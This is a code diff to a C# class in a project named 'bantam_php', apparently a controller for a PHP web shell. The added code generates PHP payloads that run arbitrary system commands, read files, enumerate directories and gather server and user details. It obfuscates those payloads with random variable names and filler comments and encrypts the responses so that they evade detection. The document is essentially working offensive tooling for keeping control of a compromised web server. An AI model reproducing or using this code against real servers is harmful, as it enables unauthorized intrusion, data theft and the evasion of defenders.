@@ -66,18 +66,57 @@ namespace bantam_php
         public static string windowsOS_Ver          = "ver";
         public static string posixOS_Whoami         = "whoami";
 
-        public static void ShuffleList<T>(IList<T> list)
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="maxNum"></param>
+        /// <returns></returns>
+        public static string RandomPHPVar(int maxNum = 16)
         {
-            Random random = new Random();
-            int n = list.Count;
+            int length = Helper.RandomNumber(maxNum);
+            return "$" + Helper.RandomString(1, true) + Helper.RandomString(maxNum - 1, true, true);
+        }
 
-            for (int i = list.Count - 1; i > 1; i--) {
-                int rnd = random.Next(i + 1);
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="maxNum"></param>
+        /// <returns></returns>
+        public static string RandomPHPComment(int maxNum = 24)
+        {
+            //check global cfg check "" if off, and have a slider for amount of comments, and a slider for length of comments
+            int length = Helper.RandomNumber(maxNum);
+            return "";// "/*" + Helper.RandomString(length, true, true)  + "*/";
+        }
 
-                T value = list[rnd];
-                list[rnd] = list[i];
-                list[i] = value;
-            }
+        /// <summary>
+        /// todo possibly kill  the encrytion if empty result
+        /// </summary>
+        /// <returns></returns>
+        public static string EncryptPhpVariableAndEcho(ref string encryptionKey, ref string encryptionIV)
+        {
+            //todo make dynamic/random
+            string varName = "$result";
+
+            encryptionIV = EncryptionHelper.GetRandomEncryptionIV();
+            encryptionKey = EncryptionHelper.GetRandomEncryptionKey();
+
+            string padVar = RandomPHPVar();
+            string cryptTextvar = RandomPHPVar();
+            string blockBar = RandomPHPVar();
+
+            string encryption = RandomPHPComment()
+                    + blockBar + " = mcrypt_get_block_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);" 
+                + RandomPHPComment() 
+                    + padVar + " = " + blockBar + " - (strlen(" + varName + ") % " + blockBar + ");" 
+                + RandomPHPComment() 
+                    + varName + " .= str_repeat(chr(" + padVar + "), " + padVar + ");" 
+                + RandomPHPComment()
+                    + cryptTextvar + " = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, '" + encryptionKey + "', " + varName + ", MCRYPT_MODE_CBC, '" + encryptionIV + "');" 
+                + RandomPHPComment() 
+                    + "echo base64_encode(" + cryptTextvar + ");";
+
+            return encryption;
         }
 
         /// <summary>
@@ -86,29 +125,31 @@ namespace bantam_php
         /// 
         public static string InitShellData(bool encryptResponse)
         {
-            string osVar = EncryptionHelper.RandomPHPVar();
-            string cwdVar = EncryptionHelper.RandomPHPVar();
-            string freespaceVar = EncryptionHelper.RandomPHPVar();
-            string totalfreespaceVar = EncryptionHelper.RandomPHPVar();
-            string releaseVar = EncryptionHelper.RandomPHPVar();
-            string kernelVar = EncryptionHelper.RandomPHPVar();
-            string serverIpVar = EncryptionHelper.RandomPHPVar();
-            string serverSoftwareVar = EncryptionHelper.RandomPHPVar();
-            string userVar = EncryptionHelper.RandomPHPVar();
-            string uidVar = EncryptionHelper.RandomPHPVar();
-            string gidVar = EncryptionHelper.RandomPHPVar();
-            string groupVar = EncryptionHelper.RandomPHPVar();
-            string phpVersionVar = EncryptionHelper.RandomPHPVar();
+            string osVar = RandomPHPVar();
+            string cwdVar = RandomPHPVar();
+            string freespaceVar = RandomPHPVar();
+            string totalfreespaceVar = RandomPHPVar();
+            string releaseVar = RandomPHPVar();
+            string kernelVar = RandomPHPVar();
+            string serverIpVar = RandomPHPVar();
+            string serverSoftwareVar = RandomPHPVar();
+            string userVar = RandomPHPVar();
+            string uidVar = RandomPHPVar();
+            string gidVar = RandomPHPVar();
+            string groupVar = RandomPHPVar();
+            string phpVersionVar = RandomPHPVar();
 
             string responseCode = string.Empty;
             string linesRandomized = string.Empty;
 
+            //order of these lines don't matter so we shuffle them around
             List<string> lines = new List<string> {
                 osVar + " = 'nix'; if (strtolower(substr(PHP_OS, 0, 3)) == 'win'){ " + osVar + " = 'win';}",
-                freespaceVar + " = @diskfreespace(" + cwdVar + ");",
-                cwdVar + " = dirname(__FILE__);",
-                totalfreespaceVar + " = @disk_total_space(" + cwdVar + ");",
-                totalfreespaceVar + " = " + totalfreespaceVar + " ? " + totalfreespaceVar + " : 1;",
+
+                cwdVar + " = dirname(__FILE__);" + freespaceVar + " = @diskfreespace(" + cwdVar + ");" 
+                       + totalfreespaceVar + " = @disk_total_space(" + cwdVar + ");" + totalfreespaceVar 
+                       + " = " + totalfreespaceVar + " ? " + totalfreespaceVar + " : 1;",
+
                 releaseVar + " = @php_uname('r');",
                 kernelVar + " = @php_uname('s');",
                 serverIpVar + " = $_SERVER['SERVER_ADDR'];",
@@ -116,8 +157,7 @@ namespace bantam_php
                 phpVersionVar + @" = phpversion();"
             };
 
-            ShuffleList(lines);
-            //lines.ShuffleList();
+            Helper.ShuffleList(lines);
 
             if (encryptResponse) {
                 responseCode = "$result = " + osVar + ".'" + colSeperator
@@ -151,21 +191,35 @@ namespace bantam_php
 
             foreach(var line in lines) {
                 linesRandomized += line;
+                linesRandomized += RandomPHPComment();
             }
           
-            return linesRandomized + "if (!function_exists('posix_getegid')) {"
-	                + userVar + " = @get_current_user();"
-	                + uidVar + " = @getmyuid();"
-	                + gidVar + " = @getmygid();"
-	                + groupVar + @" = '?';
-                } else {
-	                "+ uidVar + " = @posix_getpwuid(posix_geteuid());"
-	                + gidVar + " = @posix_getgrgid(posix_getegid());"
-	                + userVar + "= "+ uidVar + "['name'];"
-	                + uidVar + " = "+ uidVar + "['uid'];"
-	                + gidVar + " = "+ gidVar + "['gid'];"
-	                + groupVar + " = "+ gidVar + @"['name'];
-                }" + responseCode;
+            return linesRandomized + "if (!function_exists('posix_getegid')) {" 
+                                   + RandomPHPComment()
+                                    + userVar + " = @get_current_user();" 
+                                   + RandomPHPComment()
+                                    + uidVar + " = @getmyuid();" 
+                                   + RandomPHPComment()
+                                    + gidVar + " = @getmygid();" 
+                                   + RandomPHPComment()
+                                    + groupVar + " = '?';" 
+                                   + RandomPHPComment()
+                                    + "} else {" 
+	                                + uidVar + " = @posix_getpwuid(posix_geteuid());" 
+                                   + RandomPHPComment()
+                                    + gidVar + " = @posix_getgrgid(posix_getegid());" 
+                                   + RandomPHPComment()
+                                    + userVar + "= "+ uidVar + "['name'];" 
+                                   + RandomPHPComment()
+                                    + uidVar + " = "+ uidVar + "['uid'];" 
+                                   + RandomPHPComment()
+                                    + gidVar + " = "+ gidVar + "['gid'];" 
+                                   + RandomPHPComment()
+                                    + groupVar + " = "+ gidVar + "['name'];" 
+                                   + RandomPHPComment()
+                                    + "}" 
+                                   + responseCode 
+                                   + RandomPHPComment();
         }
 
         /// <summary>
@@ -177,9 +231,19 @@ namespace bantam_php
         public static string PhpInfo(bool encryptResponse)
         {
             if (encryptResponse) {
-                return "@ob_start(); @phpinfo(); $result = @ob_get_contents(); @ob_end_clean();";
+                return RandomPHPComment() 
+                        + "@ob_start();" 
+                      + RandomPHPComment()
+                        + "@phpinfo();" 
+                      + RandomPHPComment()
+                        + "$result = @ob_get_contents();" 
+                      + RandomPHPComment()
+                        + "@ob_end_clean();"
+                      + RandomPHPComment();
             } else {
-                return "phpinfo();";
+                return RandomPHPComment() 
+                        + "phpinfo();" 
+                    + RandomPHPComment();
             }
         }
 
@@ -192,10 +256,14 @@ namespace bantam_php
         {
             string phpTestExecutionWithEcho = string.Empty;
             if (encryptReponse) {
-                phpTestExecutionWithEcho = "$result = '1';";
+                phpTestExecutionWithEcho = RandomPHPComment() 
+                                            + "$result = '1';" 
+                                         + RandomPHPComment();
 
             } else {
-                phpTestExecutionWithEcho = "echo '1';";
+                phpTestExecutionWithEcho = RandomPHPComment() 
+                                            + "echo '1';" 
+                                         + RandomPHPComment();
             }
             return phpTestExecutionWithEcho;
         }
@@ -205,32 +273,31 @@ namespace bantam_php
         /// </summary>
         /// <param name="encryptResponse"></param>
         /// <returns></returns>
-        public static string OsDetectPhp(bool encryptResponse)
-        {
-            string osDetectPHP = string.Empty;
-            if (encryptResponse) {
-                osDetectPHP = "$result; if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ $result = 'win'; } else { $result = 'nix'; }";
-            } else {
-                osDetectPHP = "if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ echo 'win'; } else { echo 'nix'; }";
-            }
-            return osDetectPHP;
-        }
-
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="encryptResponse"></param>
-        /// <returns></returns>
         public static string GetHardDriveLettersPhp(bool encryptResponse)
         {
             string getHardDriveLetters = string.Empty;
-            string driveVar = EncryptionHelper.RandomPHPVar();
+            string driveVar = RandomPHPVar();
 
             if (encryptResponse) {
-                getHardDriveLetters = "$result; foreach (range('a', 'z') as " + driveVar + ") { if (is_dir(" + driveVar + " . ':\\')) { $result .= " + driveVar + ".':|'; }}";
+                getHardDriveLetters = RandomPHPComment()
+                                        + "$result; foreach (range('a', 'z') as " + driveVar + ") {"
+                                    + RandomPHPComment()
+                                        + "if (is_dir(" + driveVar + @". ':\\')) { "
+                                    + RandomPHPComment()
+                                        + "$result .= " + driveVar + ".':|';"
+                                    + RandomPHPComment()
+                                        + "}}"
+                                    + RandomPHPComment();
             } else {
-                getHardDriveLetters = "foreach (range('a', 'z') as " + driveVar + ") { if (is_dir(" + driveVar + " . ':\\')) { echo " + driveVar + ".':|'; }}";
+                getHardDriveLetters = RandomPHPComment()
+                                        + "foreach (range('a', 'z') as " + driveVar + ") {"
+                                    + RandomPHPComment()
+                                        + "if (is_dir(" + driveVar + @". ':\\')) {"
+                                    + RandomPHPComment()
+                                        + "echo " + driveVar + ".':|';"
+                                    + RandomPHPComment()
+                                        + "}}"
+                                    + RandomPHPComment();
             }
             return getHardDriveLetters;
         }
@@ -244,9 +311,13 @@ namespace bantam_php
         public static string ReadFileProcedure(string fileName, bool encryptResponse)
         {
             if (encryptResponse) {
-                return @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';";
+                return RandomPHPComment() 
+                        + @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';" 
+                    + RandomPHPComment();
             } else {
-                return "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';";
+                return RandomPHPComment() 
+                     + "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';" 
+                    + RandomPHPComment();
             }
         }
 
@@ -285,9 +356,17 @@ namespace bantam_php
         public static string ExecuteSystemCode(string code, bool encryptResponse)
         {
             if (encryptResponse) {
-                return "@ob_start(); @system('" + code + "'); $result = @ob_get_contents(); @ob_end_clean();";
+                return RandomPHPComment() 
+                        + "@ob_start();" 
+                    + RandomPHPComment() 
+                        + "@system('" + code + "');" 
+                    + RandomPHPComment() 
+                        + "$result = @ob_get_contents();"
+                    + RandomPHPComment()
+                        + "@ob_end_clean();"
+                    + RandomPHPComment();
             } else {
-                return "@system('" + code + "');";
+                return RandomPHPComment() + "@system('" + code + "');" + RandomPHPComment();
             }
         }
 
@@ -299,47 +378,29 @@ namespace bantam_php
         /// <returns></returns>
         public static string DirectoryEnumerationCode(string location, string phpVersion, bool responseEncryption)
         {
-            string varItem = EncryptionHelper.RandomPHPVar();
-            string varFile = EncryptionHelper.RandomPHPVar();
+            string varItem = RandomPHPVar();
+            string varFile = RandomPHPVar();
 
             if (responseEncryption) {
-                return @"$result; function PermsColor(" + varFile + @") {
-		            if (!@is_readable(" + varFile + @")) {
-			            return 'red';
-		            } elseif (!@is_writable(" + varFile + @")) {
-			            return 'grey';
-		            } else {
-			            return 'green';
-                    }
-	            }
-                try{ 
-                    foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {
-			            $result .= " + varItem + "->getBasename().'" + colSeperator + "'."
-                                     + varItem + "->getPath().'" + colSeperator + "'."
-                                     + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + colSeperator + "'."
-                                     + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + colSeperator + "'."
-                                     + "PermsColor(" + varItem + @"->getPathname()).'" + rowSeperator + @"';
-		            }
-                }catch(Exception $e){  }";
+                return RandomPHPComment() 
+                 + @" try{ " + RandomPHPComment() 
+                 + @"foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {" + RandomPHPComment() 
+                 + @"$result .= " + varItem + "->getBasename().'" + colSeperator + "'."
+                        + varItem + "->getPath().'" + colSeperator + "'."
+                        + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + colSeperator + "'."
+                        + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + colSeperator + "'."
+                        + varItem + @"->getPerms().'" + rowSeperator + @"';" + RandomPHPComment() + @"
+		            }}catch(Exception $e){ }" + RandomPHPComment();
             } else {
-                return @"function PermsColor(" + varFile + @") {
-		            if (!@is_readable(" + varFile + @")) {
-			            return 'red';
-		            } elseif (!@is_writable(" + varFile + @")) {
-			            return 'grey';
-		            } else {
-			            return 'green';
-                    }
-	            }
-                try{ 
-                    foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {
-			            echo " + varItem + "->getBasename().'" + colSeperator + "'."
-                               + varItem + "->getPath().'" + colSeperator + "'."
-                               + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + colSeperator + "'."
-                               + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + colSeperator + "'."
-                               + "PermsColor(" + varItem + @"->getPathname()).'" + rowSeperator + @"';
-		            }
-                }catch(Exception $e){  }";
+                return RandomPHPComment()
+                 + @" try{ " + RandomPHPComment()
+                 + @"foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {" + RandomPHPComment()
+                 + @"echo " + varItem + "->getBasename().'" + colSeperator + "'."
+                        + varItem + "->getPath().'" + colSeperator + "'."
+                        + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + colSeperator + "'."
+                        + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + colSeperator + "'."
+                        + varItem + @"->getPerms().'" + rowSeperator + @"';" + RandomPHPComment() + @"
+		            }}catch(Exception $e){ }" + RandomPHPComment();
             }
         }
 
@@ -351,18 +412,6 @@ namespace bantam_php
         public static string TaskListFunction(bool windowsOS = true)
         {
             return (windowsOS) ? windowsOS_TaskList : linuxOS_PsAux;
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="code"></param>
-        /// <returns></returns>
-        public static string MinifyCode(string code)
-        {
-            string clean = Regex.Replace(code, @"\t|\n|\r", string.Empty);
-            string clean2 = Regex.Replace(clean, @"[^\u0000-\u007F]+", string.Empty);
-            return Regex.Replace(clean2, @"\s+", " ");
         }
     }
 }
